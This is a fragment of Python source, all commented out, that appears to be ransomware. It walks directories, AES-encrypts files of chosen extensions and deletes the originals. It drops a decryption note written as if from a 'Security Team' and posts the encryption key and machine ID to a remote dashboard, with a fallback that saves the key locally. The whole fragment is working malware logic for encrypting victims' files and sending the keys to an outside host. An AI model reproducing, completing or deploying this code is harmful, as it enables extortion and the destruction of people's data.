# # Step 10: Function to encrypt a single file
#     def encrypt_file(self, file_path):
#         try:
#             iv = get_random_bytes(16)
#             cipher = AES.new(self.key, AES.MODE_CBC, iv)
#             with open(file_path, 'rb') as f:
#                 file_data = f.read()
#             encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
#             with open(file_path + '.encrypted', 'wb') as f:
#                 f.write(iv + encrypted_data)
#             os.remove(file_path)
#             logging.info(f"Encrypted {file_path}")
#         except Exception as e:
#             logging.error(f"Failed to encrypt {file_path}: {str(e)}")

#     # Step 11: Function to encrypt all files in a directory
#     def encrypt_files_in_directory(self, directory_path):
#         try:
#             for root, dirs, files in os.walk(directory_path):
#                 if '$RECYCLE.BIN' in root:
#                     continue

#                 for file in files:
#                     if any(file.endswith(ext) for ext in self.extensions):
#                         file_path = os.path.join(root, file)
#                         self.encrypt_file(file_path)
#             logging.info(f"All files in {directory_path} encrypted successfully.")
#         except Exception as e:
#             logging.error(f"Failed to encrypt files in directory {directory_path}: {str(e)}")
# # Part 4: User Manual Creation and Key Management

#     # Step 12: Function to create a user manual
#     def create_user_manual(self, directory_path):
#         manual_content = f"""Dear User,
# Your files have been secured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} with a unique machine ID: {self.machine_id}.
# Please keep this machine ID safe. You will need it along with your decryption key to unlock your files.
# In case of any issues or to obtain your decryption key, please contact your IT department or your system administrator for further details.
# Thank you,
# Your Security Team
# """
#         manual_path = os.path.join(directory_path, "READ_ME_FOR_DECRYPTION.txt")
#         try:
#             with open(manual_path, "w") as manual_file:
#                 manual_file.write(manual_content)
#             logging.info("User manual created successfully.")
#         except Exception as e:
#             logging.error(f"Failed to create user manual: {str(e)}")

#     # Step 13: Function to send the encryption key to the dashboard
#     def send_key_to_dashboard(self):
#         encoded_key = base64.b64encode(self.key).decode('utf-8')
#         payload = {'machine_id': self.machine_id, 'encryption_key': encoded_key}
#         headers = {'Content-Type': 'application/json'}

#         for attempt in range(self.max_attempts):
#             logging.info(f"Attempt {attempt + 1} to send encryption key.")
#             try:
#                 response = requests.post(self.dashboard_url, headers=headers, data=json.dumps(payload))
#                 if response.ok:
#                     logging.info('Key sent successfully. Response OK.')
#                     return True
#                 else:
#                     logging.error(f'Attempt {attempt + 1} failed. Status Code: {response.status_code}. Response: {response.text}')
#             except requests.exceptions.ConnectionError as e:
#                 logging.error(f"Connection error on attempt {attempt + 1}: {e}")
#             if attempt < self.max_attempts - 1:
#                 time.sleep(self.delay)
#         logging.error("All attempts to send the key failed.")
#         return False

#     # Step 13.1: Function to save the encryption key locally
#     def save_key_locally(self):
#         key_path = os.path.join('D:', 'encryption_key.txt')
#         try:
#             os.makedirs(os.path.dirname(key_path), exist_ok=True)
#             with open(key_path, 'w') as file:
#                 file.write(f"Machine ID: {self.machine_id}\n")
#                 file.write(f"Encryption Key: {base64.b64encode(self.key).decode('utf-8')}\n")
#             logging.info(f"Encryption key saved locally to {key_path}.")
#             return True
#         except Exception as e:
#             logging.error(f"Failed to save encryption key locally: {str(e)}")
#             return False
        